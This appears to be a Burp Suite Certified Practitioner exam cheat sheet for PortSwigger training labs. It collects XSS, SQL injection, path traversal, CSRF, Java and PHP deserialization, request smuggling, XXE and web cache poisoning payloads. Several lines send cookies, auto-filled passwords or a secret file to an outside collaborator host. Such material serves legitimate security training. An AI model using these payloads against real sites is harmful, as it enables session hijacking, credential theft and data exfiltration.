# <img src="https://icons.iconarchive.com/icons/goescat/macaron/1024/burp-suite-icon.png" width=25> BSCP Methodology

## Table of Contents
* [Exam Info](#exam-info)
* [Useful Burp extensions](#useful-burp-extensions-some-of-them-requires-burpsuite-pro)
* [Cross-Site Scripting Section](#cross-site-scripting-section)
   * [Bypass restrictions method 1](#bypass-restrictions-method-1)
   * [Capture credentials from auto-filled forms](#capture-credentials-from-auto-filled-forms)
   * [DOM XSS](#dom-xss)
   * [XSS Payloads](#different-xss-payloads)
* [Exploit Server Section](#exploit-server-section)
  * [Send exploit to victim (Reflected XSS in search bar)](#send-exploit-to-victim-reflected-xss-in-search-bar)
* [SQL Injection Section](#sql-injection-section)
  * [PostgreSQL](#postgresql)
    * [Time Based](#time-based)
  * [MySQL](#mysql)
  * [Oracle](#oracle)
  * [SQLite](#sqlite)
* [Command Injection Section](#command-injection-section)
* [Directory traversal Section](#directory-traversal-section)
* [CSRF Section](#csrf-section)
* [Insecure Deserialization Section](#insecure-deserialization-section)
  * [Java](#java)
  * [PHP](#php)
* [HTTP request smuggling Section](#http-request-smuggling-section)
  * [Response Queue Poisoning via H2.TE Request Smuggling](#response-queue-poisoning-via-h2te-request-smuggling)
  * [Request Smuggling via CRLF Injection](#request-smuggling-via-crlf-injection)
  * [Request Splitting via CRLF Injection](#request-splitting-via-crlf-injection)
* [XML External Entity XXE Injection Section](#xml-external-entity-xxe-injection-section)
  * [xinclude](#xinclude-attack-xxe)
* [Information disclosure Section](#information-disclosure-section)
* [Web Cache Poisoning Section](#web-cache-poisoning-cache)
  * [Web Cache Poisoning With an Unkeyed Cookie](#web-cache-poisoning-with-an-unkeyed-cookie)
  * [Basic Web cache poisoning](#basic-web-cache)
  * [Targeted web cache poisoning using an unknown header](#targeted-web-cache-poisoning-using-an-unknown-header)
  * [Parameter Cloaking](#parameter-cloaking)

## Exam Info
[BSCP Cheat sheet](https://gist.github.com/dhmosfunk/b5731d149ffc6c2dd4760d666537b4f6) = needs translate <br>
There is always an administrator account with the username "administrator", plus a lower-privileged account usually called "carlos". If you find a username enumeration vulnerability, you may be able to break into a low-privileged account using the following [username](https://portswigger.net/web-security/authentication/auth-lab-usernames) list and [password](https://portswigger.net/web-security/authentication/auth-lab-passwords) list.

Each application has up to one active user, who will be logged in either as a user or an administrator. You can assume that they will visit the homepage of the site every 15 seconds, and click any links in any emails they receive from the application. You can use exploit server's "send to victim" functionality to target them with reflected vulnerabilities.

<b>If you find an SSRF vulnerability, you can use it to read files by accessing an internal-only service, running on localhost on port 6566.</b>

### Each stage can be cross referenced to the types of vulnerabilities you can observe.
#### Objective for Stage 1: Get any user access

* SQL Injection
* Cross-Site Scripting
* Authentication / Credentials Brute force
* Request Smuggling
* Web Cache Poisoning

#### Objective for Stage 2: Get Admin access

* SQL Injection
* Cross-Site Scripting
* Cross Site Request Forgery
* HTTP host header attacks
* Server-Side Request Forgery
* Access Control vulnerabilities
* Authentication / Credentials Brute force

#### Objective for Stage 3: Read Contents of ‘/home/carlos/secret’

* XML External Entities
* SQL Injection
* Command Injection
* Server-Side Template Injection
* Path Traversal
* File Upload attacks
* Insecure Deserialization

## Useful Burp extensions (some of them requires burpsuite pro)
- Hackvertor
- Copy As Python-Requests
- Java Deserialization Scanner | [ysoserial.jar](https://github.com/frohoff/ysoserial) for manual exploitation<b>(prefer because sometime this extension it doesn't work as it should)</b>
- HTTP Request Smuggler
- Param Miner


## Cross-Site Scripting Section
When the exam involve XSS for the user part start search about javascript file in the source code or use the [DOM Invader](#dom-xss) into search forms.<br>
You can find an injection point with some payloads from this repository - [PayloadsAllTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) <br>
Also here - [XSS Payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all)

### Bypass restrictions method 1
Sometimes we found a XSS injection point but with some keyword restrictions, so we have to bypass these restrictions with some techniques like below.
1. Generate the base64 payload

```bash
echo -n "document.location = 'http://<BURP-COLLABORATOR.NET>/?cookie='+document.cookie" |base64
```

2. Insert the base64 payload into atob function
```javascript
eval(atob("BASE64-PAYLOAD"))
<script>eval(atob("BASE64-PAYLOAD"))</script>
```

### Capture credentials from auto-filled forms
Sometimes we use password managers that fill in forms automatically and with this technique we can grab those credentials just making a small html form.
```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://zy1cmwt0q8o3vtlolrhvx9nfn6t7hw.burpcollaborator.net',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
});">
```

### DOM XSS
An awesome google chrome(from burp suite) extension is <b>DOM Invader</b> which you can use it for DOM XSS testing

## Exploit Server Section
#### Send exploit to victim (Reflected XSS in search bar)
With <b>`<meta>`</b> html tag we can redirect the "victim" to our javascript injected search query.
```html
<meta http-equiv="refresh" content='0; URL=https://<LAB_URL>/?search=injection_here' />

<!-- ALL TOGETHER BELOW-->
<meta http-equiv="refresh" content='0; URL=https://<LAB_URL>/?SearchTerm=aa","fd8xsw5l":eval(atob("BASE64-PAYLOAD"))}//' />
```

Useful source from portswigger during exam: [Cross Site Scriping Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
### Different XSS Payloads
```javascript
${alert(1)}
<svg><animatetransform%20§§=1>
<><img src=1 onerror=alert(1)>
\"-alert(1)}//
</script><img src=1 onerror=alert(document.domain)>
\';alert(1)//
http://xxxxx.com?&apos;-alert(414)-&apos;
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';


//dom 
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"> //web messages and a JavaScript URL



//angular
{{$on.constructor('alert(1)')()}}
{{$on.constructor('document.location=`http://<BURP-COLLABORATOR-URL>/?cookies=`+document.cookie')()}} //steal cookies with angular xss

```

## SQL Injection Section

[SQL Injection cheat sheet PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
<br>
### Useful solved labs:
* [SQL injection with filter bypass via XML encoding](https://github.com/dhmosfunk/BSCP/tree/main/recommended_labs#lab-sql-injection-with-filter-bypass-via-xml-encoding)
* [Blind SQL injection with out-of-band data exfiltration](https://github.com/dhmosfunk/BSCP/tree/main/recommended_labs#0x2-lab-blind-sql-injection-with-out-of-band-data-exfiltration)


### PostgreSQL
#### Time Based
Identify time based
```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

Database Dump Time Based<br>

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

Table Dump Time Based <br>

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

Columns Dump Time Based <br>
```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name where column_name='value' limit 1
```


### MySQL

### Oracle

### SQLite

## Command Injection Section
[Link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#chaining-commands)

## Directory Traversal Section
```bash
../../../etc/passwd # Simple case
..%252f..%252f..%252fetc/passwd # Double URL Encoding
....//....//....//etc/passwd # Stripped non-recursively
../../../etc/passwd%00.png # Null byte bypass 
images/../../../etc/passwd # Validation of start of path
```

## CSRF Section

### Referer validation depends on header being present
`<meta name="referrer" content="no-referrer">`

### CSRF with broken Referer validation
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState("", "", "/?ID.web-security-academy.net")</script>
    <form action="https://0ad600eb04f49764c08e71fc00410092.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="dd&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```


<img src="https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/CSRF%20Injection/Images/CSRF-CheatSheet.png?raw=true">




## Insecure Deserialization Section


### Java
If you have `Java Deserialization Scanner` burp extension you can do an active scan(pro version only) and maybe you will find something ;) at least exploit it manually with the below tool.
#### ysoseriar.jar
payloads about `ysoseriar` <br>
<b>Dont forget</b> the below payloads requires url encoding after payload are generated
```bash
java -jar ysoseriar.jar CommonsCollections7 'curl -d @/home/carlos/secret k3of2usea0s8kzkwsqnme9bj2a83ws.burpcollaborator.net' | gzip|base64 

java -jar ysoseriar.jar <PAYLOAD> 'COMMAND' | encoding
```
For more information about payloads and stuff you can find in the ysoserial [official repository](https://github.com/frohoff/ysoserial)

### PHP

#### Simple modifying of PHP serialize object
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=

Base64 decoded
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```
As we can see there is a field key called `admin` with one boolean filed value 0 -> False. 
Changing the boolean value to 1 automatically we are going to be a administrator.
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

[phpggc](https://github.com/ambionics/phpggc)


## HTTP request smuggling Section
### Useful solved labs:
* [Capture other users request via HTTP Request Smuggling](https://github.com/dhmosfunk/BSCP/tree/main/recommended_labs#0x5-lab-exploiting-http-request-smuggling-to-capture-other-users-requests)

For manual exploitation CL.TE TE.CL we can use the [Simple HTTP Smuggler Generator CL.TE TE.CL](https://github.com/dhmosfunk/simple-http-smuggler-generator) 

### Response queue poisoning via H2.TE request smuggling
```
POST / HTTP/2
Host: xxx.net
Transfer-Encoding: chunked

0

SMUGGLED
```
```
POST /x HTTP/2
Host: xxx.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: xxx.net
```
"Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie."
```
POST /x HTTP/2
Host: xxx.net
Transfer-Encoding: chunked

0

GET /admin HTTP/2
Host: xxx.net
Cookie: session=STOLEN-SESSION-COOKIE
```

### Request smuggling via CRLF injection

Add a `foo` header and from `inspector` change the value of `foo` header like below
```
HTTP/2

foo:bar\r\nTransfer-Encoding: chunked
```
After applying the `Transfer-Encoding` header the request will be `kettled` so you cant see other headers, you can only append content to body like below
You request has to look like below
![image](https://user-images.githubusercontent.com/45040001/194731138-30e61723-6f32-4800-863a-cd4fcba39ed7.png)
```
0

POST /post/comment HTTP/1.1
Host: 0a5e008f045ff87bc06fc9ae00630039.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 910
Cookie: session=dUB4Rv3FqQDaRnWPsJ7X99fzDVGYLGvy;

csrf=m6zNlm811zQtwcOUpHr7ShoU6b4IwAHA&postId=3&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=aaa
```

### Request splitting via CRLF injection

Add a `foo` header and from `inspector` change the value of foo header like below
```
bar\r\n
Host: 0aab009204d51605c0a31134007c0017.web-security-academy.net\r\n
\r\n
GET /admin HTTP/1.1
```
Send requests repeatedly until you get 302 redirect to /my-account with the session cookie of the administrator.


## XML external entity (XXE) injection Section

### xIncLUde attack xxe
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

## Information disclosure Section
Always go for directory brute force and for .files(hidden files) e.g. <b>.git</b>

## Web Cache Poisoning Cache
Useful tip for web cache poisoning is to use the `paraminer` burp exension.


### Web cache poisoning with an unkeyed cookie:
`fehost="-alert(document.cookies)-"`

### Basic Web cache 
`X-Forwarded-Host` header has been used by the application to generate an Open Graph URL inside a meta tag.


### Targeted web cache poisoning using an unknown header
`Vary: User-Agent` -> "For example, if the attacker knows that the User-Agent header is part of the cache key, by first identifying the user agent of the intended victims, they could tailor the attack so that only users with that user agent are affected."

`X-Host: exploitserver.net/resources/js/tracking.js`

Steal other users `User-Agents`:
If you have post functionality you can use this payload:
```html
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
```
and final step is to poison the victims user-agents stoled from img tag

### Parameter cloaking
`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`

### X-Forwarded-Scheme web cache poisoning method
![image](https://user-images.githubusercontent.com/45040001/198842791-c04aa06e-2818-435a-8556-9b0e57c2ca7f.png)
